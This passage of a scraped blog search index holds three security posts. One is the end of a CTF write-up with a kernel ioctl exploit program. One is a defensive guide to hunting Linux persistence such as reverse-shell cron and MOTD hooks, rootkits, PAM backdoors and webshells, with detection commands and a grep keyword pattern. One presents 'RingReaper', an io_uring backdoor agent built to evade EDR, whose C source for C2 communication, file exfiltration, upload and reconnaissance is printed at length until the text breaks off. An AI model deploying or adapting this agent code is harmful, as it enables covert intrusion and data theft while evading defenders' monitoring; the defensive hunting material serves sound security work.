*(uint32_t*)buf = val1; *(uint32_t*)(buf + 4) = val2; fd = open(\u0026#34;/dev/ioctl_dev\u0026#34;, O_RDWR); if (fd \u0026lt; 0) { perror(\u0026#34;open\u0026#34;); return 1; } if (ioctl(fd, 0xc0487213, buf) \u0026lt; 0) { perror(\u0026#34;ioctl\u0026#34;); close(fd); return 1; } printf(\u0026#34;Flag: %s\\n\u0026#34;, buf); close(fd); return 0; } Compiling and Running Since we\u0026rsquo;re connected via SSH, we can easily copy the code and compile it:\nroot@hunter:~# gcc exploit.c -o exploit root@hunter:~# ./exploit Flag: ROOTKIT{ioctl_secret_unlocked@1337} Success! We\u0026rsquo;ve captured the flag!\nWhy It Works The exploit works because the kernel module uses the same buffer for both receiving input and sending output. We create a 72-byte buffer (buf[0x48]), write the magic values 0x1337DEAD and 0xCAFEBABE at the beginning using pointer casting ((uint32_t)buf), then open the device and call ioctl() with command 0xc0487213.\nThe kernel validates our magic values with _copy_from_user(), and if they match, uses _copy_to_user() with the same pointer to overwrite our buffer with the flag.\nKey Lessons Learned 1. Check dmesg for Kernel Activity Kernel messages provided crucial information about module loading and potential issues.\n2. Understand ioctl Communication The ioctl interface is a powerful way for userspace to communicate with kernel drivers. Understanding the command numbers and data structures is essential.\n3. Reversing Skills Being comfortable with tools like Ghidra, IDA, or Binary Ninja is crucial for kernel module analysis.\nConclusion This challenge was an excellent introduction to Reversing and you can learn:\nLinux kernel modules Reverse engineering Crafting ioctl requests Recognizing rootkit techniques Our Community Join the Rootkit Researchers community:\nDiscord Server\nChallenge created by Matheuz - Have fun guys!!\nThanks for reading! If you enjoyed this writeup, consider sharing it with others who might find it useful. Happy hacking!\n","permalink":"http://localhost:1313/hacking/ioctl-secrets/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/ZTjHU7a.jpeg\" alt=\"img\"  /\u003e\n\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cp\u003eIn this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhat we have:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA hidden kernel module loaded at boot\u003c/li\u003e\n\u003cli\u003eCharacter device at \u003ccode\u003e/dev/ioctl_dev\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSetup script (\u003ccode\u003edevice.sh\u003c/code\u003e) that loads the module and shreds source files\u003c/li\u003e\n\u003cli\u003eSSH access enabled (username: \u003ccode\u003eroot\u003c/code\u003e, password: \u003ccode\u003eioctl\u003c/code\u003e)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eImportant Note:\u003c/strong\u003e Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, \u003cstrong\u003eSSH is enabled\u003c/strong\u003e for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\u003c/p\u003e","title":"Ioctl Secrets Writeup"},{"content":" Hello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\nThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\nBelow is what we will cover in this post.\nSSH Keys Crontab Bashrc APT Privileged user \u0026amp; SUID bash Malicious Systemd Hunting LKM Rootkits LD_PRELOAD rootkit PAM Backdoor ACL init.d Motd Mount process for hide any pid. Webshells rc.local But before we start, we need to understand what persistence is.\nWhat is persistence? Persistence in Linux, refers to the ability of malware, such as rootkits, backdoors and we can also abuse common Linux features for malicious uses to remain active on the system even after reboots. These threats seek to maintain unauthorized access and conceal their presence, making them persistent challenges for detection and removal.\nSo now we understand what persistence is, to be able to defend our systems we need to know where to look and how to remove it, so let\u0026rsquo;s go!\nHunting for Malicious SSH Keys It is correct to say that the simplest method of maintaining persistence is using ssh keys, so it is always good before analyzing an infected machine, for example, to see if there is an ssh key that you do not know, you can view it this with just one command line.\nfor home_dir in /home/*; do [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;HOME \\\u0026#34;$(basename \u0026#34;$home_dir\u0026#34;)\\\u0026#34;\u0026#34;; [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; cat \u0026#34;$home_dir\u0026#34;/.ssh/*; done ls -la -R /home/*/.ssh */.ssh/* With this, the attacker could simply add his public key to the authorized_keys of some home or get the private key, and return to the machine at any time, and whenever he wants without needing a password.\nHunting for crontab persistence. Persistence via crontab is also a very old persistence technique, but it is still used today, basically, crontab allows us to schedule commands, scripts and programs to be executed automatically at regular intervals of time, and with that we can simply schedule a cron to execute a malicious script or some command, below are some examples.\nIn this image we see a classic example of persistence using crontab, where the 5 asterisks represent that our task will be executed every 1 minute, under the root user and then we enter the path of our script.\nPaths for search cron persistence\ncat /etc/crontab ls -la /var/spool/* ls -la -R /var/cron* Hunting for bashrc persistence .bashrc is a script file used in Linux Bash to configure environment variables, aliases, and other terminal customizations. Thinking like an attacker, you could make a malicious alias so that when the victim runs a command, for example the ls command, it sends you a reverse shell, executes a script, among many others.\nYou can search using this command:\ncat /home/*/{.bashrc,.zshrc} ls -la /home/*/{.bashrc,.zshrc} Hunting APT command persistence In short, apt is a program package management system that has automatic resolution of dependencies between packages, easy package installation method, ease of operation, allows you to easily update your distribution, etc.\nBut until then there is nothing \u0026ldquo;malicious\u0026rdquo;, however, apt has a command called apt update, which is for updating packages, and it also has a directory in: /etc/apt/apt.conf.d.\nThe /etc/apt/apt.conf.d directory is used to manage apt specific configurations on the operating system.\nBut what if we can create a malicious configuration to be able to send a reverse shell to us every time someone uses the apt update command, yes, this is totally possible, below are some examples.\nYou can use this command to find and check them one by one.\nls -la -R /etc/apt/apt.conf.d Hunting for Privileged user \u0026amp; SUID bash In a real attack scenario, depending on the attacker can also put SUID permissions on binaries, for example bash to be able to use it with root permission, and also add a user so that he can use sudo su and be root without having to password by changing the file /etc/sudoers.\nScenario 1 Scenario 2 You can check using these commands below:\nfind / -perm /4000 2\u0026gt;/dev/null #for search suid binaries/files ls -la $(whereis bash) ls -la /etc/sudoers.d cat /etc/sudoers cat /etc/groups #Here you can also check if a user is in the wrong group Hunting for malicious systemd service Systemd is a startup and service management system it simplifies system startup and service management.\nA malicious attacker abuses systemd to create a malicious service, for example, to send a reverse shell every 1 minute.\nPersistence by a service in systemd, it is widely used, it is always good to see what services you have on your machine, a tip for this type of situation is to use pspy64 which is basically a real-time process monitor, and when a service in systemd for example is executed, it appears in pspy too, and the same goes for crontab.\nHere are some directories you can check:\nls -la /etc/systemd/system ls -la /lib/systemd/system ls -la /run/systemd/system ls -la /usr/lib/systemd/system ls -la /home/*/.config/systemd/user/ To stop the malicious service, simply run the commands:\nsystemctl stop malicious.service systemctl disable malicious.service rm malicious.service Hunting for Loadable kernel module Rootkits LKM (Loadable kernel module) rootkits are certainly an absurd challenge to hunt, as it simply hides, becomes invisible, and once it is invisible it is almost impossible to remove it, in technical details, rootkits use a function called list_del which basically removes from lsmod (list modules) that is capable of listing the machine\u0026rsquo;s kernel modules, the big problem with this is that rmmod (remove module) is not capable of removing a module that is not in lsmod, so rootkits are very efficient at remaining persistent without anyone being able to detect why this is one of the main objectives of a rootkit, to remain persistent and invisible, but in this part of the post, I will teach you some techniques that can help you find rootkits and detect them, however, as stated above, removing them is a difficult task and depends on the type of rootkit, if it is one you can find on github like for example diamorphine, it has the function of becoming visible again, and then you can remove it.\nAs you can see here, it is invisible and even if it is still in the system, you will not be able to remove it.\nBut diamorphine was also designed to be visible, by default which is by using kill -63 0 and then you can remove it.\nHunting without tools I will use the diamorphine rootkit as an example to do hunting.\nThe most basic thing to do when a rootkit is not in lsmod is to check the kernel log files, such as:\ndmesg /var/log/kern.log /var/log/dmesg* It is very important to view the kernel logs because when an LKM is entered, it generates logs there as well.\nWe can also view: /sys/kernel/tracing/available_filter_functions which is basically a feature in Linux that lists the functions available to filter events during kernel tracing.\nWe can also view all available functions with their respective addresses /sys/kernel/tracing/available_filter_functions_addrs\nIt is also very important that we check the files and commands:\n/proc/modules /proc/kallsyms /lib/modules /proc/* lsmod #to view modules ps aufwx #to view all process in machine ss -tunlpd #to view connections lsof -i -P -n #to view process in execution and file open /proc/*/maps /proc/*/cwd /proc/*/environ Hunting with tools Unhide I\u0026rsquo;ll start using unhide which is a forensic tool to find processes and TCP/UDP ports hidden by rootkits, Linux kernel modules or by other techniques.\nAs we can see in the image above, we hid a PID, and using unhide, we were able to find it.\nRkhunter (rootkit hunter) Rkhunter is a good tool, however it is based on known signatures/strings, that is, if you modify the functions you can easily bypass its detection, you can see this video using the D3m0n1z3dShell tool for this.\nHowever, for known rootkits and if they are inserted by default without any modification, rkhunter can easily detect them, in the case of diamorphine and other rootkits, if it is invisible to lsmod, depending on it it cannot detect it, which is the case with diamorphine, if I make the module visible, it detects it, otherwise it goes unnoticed.\nNow with the rootkit hidden again:\nHere is the log that rkhunter generates, and basically for it to detect if it really is the diamorphine rootkit, it uses signature/strings which is clearly very easy to bypass detection.\nThis is enough to avoid detection.\nAgain, rkhunter is good for rootkits that have not been modified and signature/strings already exist, but still, don\u0026rsquo;t trust it 100%.\nchkrootkit Chkrootkit is a rootkit detection tool on Unix-like systems. It scans the system for signs of malicious activity such as suspicious files, hidden processes, and modifications to system libraries.\nChkrootkit is good at detecting hidden processes and directory as well, but as mentioned on rkhunter, don\u0026rsquo;t trust chkrootkit 100% as it is still possible to avoid detection of an LKM rootkit.\nTracee EBPF Tracee is a runtime security and observability tool that helps you understand how your system and applications behave. Tracee uses eBPF, and it is a great forensics tool, in my opinion it is the best there is for detecting rootkits as well, as it also detects if a syscall has been hooked.\nOBS: To disable LKM insertion you can use sysctl for this:\nsudo sysctl -w kernel.modules_disabled=1 To return it to default, simply change the 1 to 0.\nHere are some talks and posts about tracee detecting LKM rootkits, it\u0026rsquo;s really worth watching!\nDetecting Linux Syscall Hooking Using Tracee\nBlackHat Arsenal 2022: Detecting Linux kernel rootkits with Aqua Tracee\neBPF Warfare - Detecting Kernel \u0026amp; eBPF Rootkits with Tracee\nHunting kernel rootkits with eBPF by Asaf Eitani \u0026amp; Itamar Maouda Kochavi\nBônus tools:\nLynis is a security auditing tool Tiger is a security audit tool #sudo apt install tiger -y Volatily #advanced memory forensics Hunting LD_PRELOAD Rootkits LD_PRELOAD rootkits are easier to hunt down and remove from the machine, because basically besides being Userland, most of them involve the use of shared object (*.so)\nIn this part, I will use a userland rootkit created by h0mbre\nSome LD_PRELOAD rootkits hide from /etc/ld.so.preload but it is possible to find it anyway.\nTo be able to confirm, it is always a good idea to check the binaries with ldd to see which shared objects it has.\nTo remove it, it\u0026rsquo;s very simple.\nAnd that\u0026rsquo;s it, it has already been removed from the machine.\nAs said, userland rootkits are much easier to detect and remove, below are some directories/files that are good to check.\n/lib/x86_64-linux-gnu /lib/* /usr/lib/x86_64-linux-gnu /usr/lib/* ls -la /etc/ld* cat /etc/ld.so.preload ldd /bin/ls ldd /bin/bash ldd /usr/bin/ssh ldd /usr/bin/netstat ldd /bin/* #check for shared object in binary, which you suspect ldd /usr/bin/* #check for shared object in binary, which you suspect /proc/*/maps Using volatily also helps a lot in this analysis process.\nHunting for PAM Backdoor PAM Backdoor is a well-known persistence technique, it works by manipulating the Pluggable Authentication Modules (PAM) authentication system. This allows unauthorized access to the system by granting a specific user privileged access regardless of correct credentials.\nI will use this repository that automates this persistence process.\nNow that the PAM Backdoor has been inserted, let\u0026rsquo;s search for it.\nOne thing we can do to detect something \u0026ldquo;abnormal\u0026rdquo; in it is to use strings, I downloaded a Normal Linux PAM on my machine and compiled it.\nMalicious pam_unix.so Here we\u0026rsquo;ll see in the strings that the password we used is there, called \u0026ldquo;hunt3r\u0026rdquo; on line 376, so we can do the same thing, look on lines 375 to 378 or so and see if there\u0026rsquo;s anything there.\nNormal pam_unix.so And now in the uninfected pam_unix.so, there is nothing interesting in these lines, so in an infected pam_unix.so, if you use the strings and analyze it, you will see the password that is used for unauthorized access\ncat /usr/include/type.h find / -name \u0026#34;pam_unix.so\u0026#34; 2\u0026gt;/dev/null ls -la /lib/security ls -la /usr/lib/security ls -la /lib/x86_64-linux-gnu/security ls -la /etc/pam.d/* Here are two repository links on github that automate persistence, you can read the code and understand it, maybe look for other ways to hunt.\nmadlib\nLinux PAM Backdoor\nHunting for ACL Persistence Just like in Active Directory/Windows, in Linux there is also an ACL, and this can be used to maintain persistence as well.\nIn a scenario where an attacker has compromised one of your Linux machines and knows that at any time he may lose access to the machine or a specific directory/file, he can abuse the ACL (access control list) by using the setfacl command to change Control access to a file or directory for any user you want, with whatever permissions you want.\nNow the user kali can access /root even without being root, because we changed the ACL of the /root directory for the user kali be able to have read, write and execute permissions.\nTo be able to do a hunt, it\u0026rsquo;s very simple, just use the command getfacl which basically displays the access control lists (ACLs) associated with files and directories and then use setfacl -b DIR/FILE for remove ACL.\nWe can also create a simple bash script to run and whatever it finds in ACL it will print on the screen.\n#!/bin/bash users=$(awk -F\u0026#39;:\u0026#39; \u0026#39;$1!=\u0026#34;root\u0026#34; {print $1}\u0026#39; /etc/passwd) check_acl_for_user() { local user=\u0026#34;$1\u0026#34; echo \u0026#34;Checking ACLs for user: $user\u0026#34; acl_output=$(getfacl -R /* | grep \u0026#34;^# file: \\|user:$user$\u0026#34;) if [[ -n \u0026#34;$acl_output\u0026#34; ]]; then echo \u0026#34;$acl_output\u0026#34; fi } for user in $users; do check_acl_for_user \u0026#34;$user\u0026#34; done Hunting init.d persistence init.d are the scripts that are executed at machine startup, that is, as soon as the machine is turned on, the scripts that are on it are executed, and this is like gold for an attacker, as he can simply add a reverse shell payload, or execute any script he wants, as soon as the machine starts/restarts.\nNow after reboot:\nTo remove it is quite simple.\nFor hunting just check these two directories:\nls -la /etc/init.d/* ls -la /etc/rc*.d/ Hunting MOTD Persistence MOTD (Message of the Day) is a message displayed to users when they log into a system, usually through SSH or the console. It is a way of providing important information, such as maintenance notices, usage policies, system news or any other relevant information to users.\nThis persistence technique basically consists of creating a malicious MOTD that when someone join into the machine using ssh for example, our Malicious MOTD will be executed, below is an example of how it works.\nBasically what we did was go to /etc/update-motd.d and create a new MOTD containing the path of a reverse shell script, so that as soon as someone sshs in, the reverse shell will be executed and Regardless of which user you enter, the shell will always be root, as ssh runs as root.\nTo be able to hunt you can check these directories looking for an Abnormal MOTD.\nls -la /etc/update-motd.d/* /usr/lib/update-notifier/update-motd-updates-available cat /etc/motd find / -name \u0026#34;*motd*\u0026#34; 2\u0026gt;/dev/null Hunting for hidden process mounted This technique of using mount to mount a process in another directory is quite old, but it\u0026rsquo;s worth knowing how it works and knowing how to undo it.\nTo be able to hunt, it\u0026rsquo;s very simple, just use the mount command to see what is mounted.\nmount mount|grep proc umount /proc/PID umount -l /proc/PID Hunting for webshells Of course, using webshells for persistence is an old technique. When an attacker gains access to a machine, even without elevated privileges, they can deploy a webshell. A webshell allows the attacker to access the machine, even without direct access to the server via browser/web and from there, the attacker can execute commands and even execute a reverse shell to gain access to the server without depending on the webshell.\nHere we have an example of a simple webshell in PHP.\nWe can detect it using this oneline and with tools too.\ngrep -rlE \u0026#39;fsockopen|pfsockopen|exec|shell|system|eval|rot13|base64|base32|passthru|\\$_GET|\\$_POST\\$_REQUEST|cmd|socket\u0026#39; /var/www/html/*.php | xargs -I {} echo \u0026#34;Suspicious file: {}\u0026#34; We can also look at the apache logs, it also shows what the file was.\nWe can also use tools like BackDoorMan, NeoPI, Shell-Detector and WebShell-AIHunter that help in detecting malicious webshells.\nHunting rc.local persistence rc.local is a startup script in Linux used to execute custom commands or scripts during the system boot process, however it has been replaced by more modern methods such as systemd service units.\nAn attacker could add a reverse shell to /etc/rc.local and every time your machine is started, the content on it will be executed with root privileges, thus providing very good and effective persistence.\nAfter the reboot, the content inside rc.local which was the reverse shell was executed successfully and we can see its process.\nWe can also see when it was run using systemctl status rc-local.\nTo be able to hunt, just check these files and directories:\n/etc/rc.local /lib/systemd/system/rc-local.service.d cat /run/systemd/generator/multi-user.target.wants/rc-local.service systemctl status rc-local So this was the post, I hope you liked it, if you have any questions or if you didn\u0026rsquo;t understand any part, DM me on Twitter: @MatheuzSecurity\nSo that\u0026rsquo;s it, until next time!\n","permalink":"http://localhost:1313/hacking/linux-threat-hunting-persistence/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/lM0kWBM.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\u003c/p\u003e\n\u003cp\u003eThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\u003c/p\u003e\n\u003cp\u003eBelow is what we will cover in this post.\u003c/p\u003e","title":"Linux Threat Hunting Persistence"},{"content":"Full source: https://github.com/MatheuZSecurity/RingReaper\nTable of Contents Introduction What is io_uring? The Agent Code Analysis How Does the EDR Typically Fail Here? Practical EDR Bypass Python C2 Server Flow Defensive Reflections Conclusion Introduction Each year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as EDR (Endpoint Detection and Response) evolve rapidly, making the work of an attacker more challenging.\nWe, as red teamers, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\nIn this article, I will explore the use of io_uring, a legitimate Linux kernel feature designed for high-performance asynchronous I/O, but which can be adapted to evade traditional syscall-based detection mechanisms. We will see how modern techniques can enable stealthy and silent operations, bypassing EDR and other monitoring mechanisms, and what this means for both attackers and defenders.\nWhat is io_uring? io_uring was introduced in Linux starting from kernel 5.1. It provides a highly performant model for asynchronous I/O operations, using submission and completion rings. In other words:\nThe process places I/O requests into a queue shared with the kernel The kernel executes them when it can, without blocking the user thread The result comes back through another completion ring The critical point is that this model allows for multiple operations (opening a file, sending data, reading from a socket, etc.) without the typical sequence of blocking syscalls that most EDRs monitor. Instead of repeatedly calling read, write, send, connect, everything happens through io_uring_submit() and mapped buffers.\nThe Agent This agent essentially acts as a \u0026ldquo;backdoor\u0026rdquo;, though it\u0026rsquo;s not persistent yet, at the time of writing, persistence modules haven\u0026rsquo;t been implemented. However, they will be added in the future. The agent connects to a server (C2) controlled by the attacker and accepts commands. It was designed with:\nNetwork communication using io_uring_prep_send and io_uring_prep_recv File reading via io_uring_prep_openat and io_uring_prep_read File upload without explicit write or read syscalls Post-exploitation command execution (listing users, processes, connections, etc.) Self-deletion (self-destruct) that removes its own binary using io_uring_prep_unlinkat On the Python-based C2 server, an operator sends interactive commands, and the agent responds discreetly.\nCode analysis of the agent send_all\nint send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) { size_t sent = 0; while (sent \u0026lt; len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); io_uring_prep_send(sqe, sockfd, buf + sent, len - sent, 0); io_uring_submit(ring); struct io_uring_cqe *cqe; io_uring_wait_cqe(ring, \u0026amp;cqe); int ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) return ret; sent += ret; } return sent; } This function ensures that a complete buffer is sent by a socket using asynchronous io_uring calls, in a way that is robust against partial sends. It works in a loop that continues until all requested bytes have been sent. For each iteration, it obtains an SQE (Submission Queue Entry) from io_uring, prepares a send (io_uring_prep_send) from the point not yet transmitted in the buffer, submits the operation, and waits for the result in the Completion Queue.\nUpon receiving confirmation from the kernel, it checks whether there was an error or whether the socket was closed (return zero or negative). If there was no error, it adds the sent bytes to the total and repeats until finished.\nThe goal is to abstract the normal limitations of the traditional send (which can send only part of the data) and perform the complete send with the minimum of blocking calls, taking advantage of the asynchronous and efficient io_uring model.\nrecv_all:\nssize_t recv_all(struct io_uring *ring, int sockfd, char *buf, size_t len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_recv(sqe, sockfd, buf, len, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); return ret; } This function reads data from a socket, also using io_uring asynchronously. Unlike send_all, it only reads once per call, since a recv is usually enough to receive the entire expected packet, without worrying about ensuring that the entire buffer has been filled.\nIt obtains the SQE, configures the receive operation (io_uring_prep_recv) with the buffer size, submits it to the kernel, and waits for the result via Completion Queue.\nIt then marks the CQE as processed and returns the number of bytes received to the caller. Thus, the function integrates data reception into the same asynchronous queue, maintaining high performance without blocking the thread.\nread_file_uring:\nThis function encapsulates the reading of an entire file using asynchronous io_uring operations, without relying on traditional blocking calls. It first opens the file with io_uring_prep_openat, waits for the result, and if successful, enters a loop to read chunks of the file in successive blocks, using io_uring_prep_read.\nEach block read is accumulated in a buffer, and the offset advances as it progresses. Reading continues until the buffer is full or until it reaches the end of the file (returning zero or negative on read). Finally, it closes the file and returns the total bytes loaded. It is a useful function to bring entire files into memory in a non-blocking way, always taking advantage of io_uring.\ncmd_users:\nvoid cmd_users(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/var/run/utmp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /var/run/utmp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } int count = ret / sizeof(struct utmp); struct utmp *entries = (struct utmp*)buf; char out[8192]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Logged users:\\n\u0026#34;); for (int i = 0; i \u0026lt; count; i++) { if (entries[i].ut_type == USER_PROCESS) { out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-8s %-8s\\n\u0026#34;, entries[i].ut_user, entries[i].ut_line); if (out_pos \u0026gt; sizeof(out) - 100) break; } } send_all(ring, sockfd, out, out_pos); } This function implements the users command, listing the users logged into the system. It reads the /var/run/utmp file (where Linux stores login sessions) via read_file_uring, parses the USER_PROCESS records, extracts usernames and their TTYs (terminals), formats a list and sends it back to the client via send_all. It is a way to show who is logged in, remotely and asynchronously.\ncmd_ss:\nvoid cmd_ss(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/proc/net/tcp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /proc/net/tcp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } char out[16384]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Local Address Remote Address State UID\\n\u0026#34;); char *line = strtok(buf, \u0026#34;\\n\u0026#34;); line = strtok(NULL, \u0026#34;\\n\u0026#34;); while (line) { unsigned int sl, local_ip, local_port, rem_ip, rem_port, st, uid; sscanf(line, \u0026#34;%u: %8X:%X %8X:%X %X %*s %*s %*s %u\u0026#34;, \u0026amp;sl, \u0026amp;local_ip, \u0026amp;local_port, \u0026amp;rem_ip, \u0026amp;rem_port, \u0026amp;st, \u0026amp;uid); char local_str[32], rem_str[32]; snprintf(local_str, sizeof(local_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (local_ip \u0026amp; 0xFF), (local_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, local_port); snprintf(rem_str, sizeof(rem_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (rem_ip \u0026amp; 0xFF), (rem_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, rem_port); out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-22s %-22s %-5X %u\\n\u0026#34;, local_str, rem_str, st, uid); if (out_pos \u0026gt; sizeof(out) - 100) break; line = strtok(NULL, \u0026#34;\\n\u0026#34;); } send_all(ring, sockfd, out, out_pos); } The cmd_ss function provides a sort of mini-netstat, reading /proc/net/tcp to collect active TCP connections. It skips the first line header and processes the rest via sscanf, converting hexadecimal addresses to decimal notation, displaying the IP, port, connection state, and UID of the socket owner. The final output is formatted as text and sent to the client with send_all, all in a way that looks like the real Linux ss command, but using asynchronous kernel file reading.\ncmd_get;\nvoid cmd_get(struct io_uring *ring, int sockfd, const char *path) { struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; int fd; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[256]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } char buf[BUF_SIZE]; ssize_t ret; off_t offset = 0; while (1) { sqe = io_uring_get_sqe(ring); io_uring_prep_read(sqe, fd, buf, sizeof(buf), offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) break; offset += ret; if (send_all(ring, sockfd, buf, ret) \u0026lt;= 0) { break; } } close(fd); } cmd_get is used to transfer files from the server to the client. It tries to open the specified path, and if successful, it reads blocks from the file with io_uring_prep_read and sends these blocks sequentially to the client with send_all. If it fails to open, it sends the client an error message. It is a way to download files from the server remotely.\ncmd_recv:\nvoid cmd_recv(struct io_uring *ring, int sockfd, const char *args) { char remote_path[256]; long expected_size = 0; char buf[BUF_SIZE]; if (sscanf(args, \u0026#34;%255s %ld\u0026#34;, remote_path, \u0026amp;expected_size) != 2 || expected_size \u0026lt;= 0) { const char *msg = \u0026#34;Usage: recv \u0026lt;remote_path\u0026gt; \u0026lt;size\u0026gt;\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); return; } struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); int fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, remote_path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } off_t offset = 0; while (offset \u0026lt; expected_size) { size_t to_read = (expected_size - offset \u0026gt; BUF_SIZE) ? BUF_SIZE : (expected_size - offset); sqe = io_uring_get_sqe(ring); io_uring_prep_recv(sqe, sockfd, buf, to_read, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t received = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (received \u0026lt;= 0) { break; } sqe = io_uring_get_sqe(ring); io_uring_prep_write(sqe, fd, buf, received, offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); io_uring_cqe_seen(ring, cqe); offset += received; } close(fd); } cmd_me:\nvoid cmd_me(struct io_uring *ring, int sockfd) { char buf[128]; pid_t pid = getpid(); char *tty = ttyname(STDIN_FILENO); if (!tty) tty = \u0026#34;(none)\u0026#34;; snprintf(buf, sizeof(buf), \u0026#34;PID: %d\\nTTY: %s\\n\u0026#34;, pid, tty); send_all(ring, sockfd, buf, strlen(buf)); } This command collects information about the running process, such as the PID and associated TTY, using traditional POSIX calls (getpid and ttyname), since io_uring does not support this. It then sends this data to the client using send_all. This is a way of “identifying” the remote agent.\ncmd_ps:\nvoid cmd_ps(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/proc\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /proc\\n\u0026#34;, 21); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;PID CMD\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { if (entry-\u0026gt;d_type != DT_DIR) continue; char *endptr; long pid = strtol(entry-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char comm_path[64]; snprintf(comm_path, sizeof(comm_path), \u0026#34;/proc/%ld/comm\u0026#34;, pid); char name[256]; int ret = read_file_uring(ring, comm_path, name, sizeof(name)); if (ret \u0026gt; 0) { name[strcspn(name, \u0026#34;\\n\u0026#34;)] = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%-7ld %s\\n\u0026#34;, pid, name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(dir); send_all(ring, sockfd, out, pos); } The cmd_ps function walks /proc to list active processes, identifying numerical directories (PIDs), and reading the command name of each process from /proc/[pid]/comm. Reading the process name is done using read_file_uring, but directory scanning does not use io_uring because it is not supported. The output is formatted into a PID + command listing, sent via send_all. It works like a remote “ps”.\ncmd_kick:\nvoid cmd_kick(struct io_uring *ring, int sockfd, const char *arg_raw) { char out[4096]; if (!arg_raw) arg_raw = \u0026#34;\u0026#34;; char *arg = (char *)arg_raw; trim_leading(\u0026amp;arg); if (strlen(arg) == 0) { DIR *d = 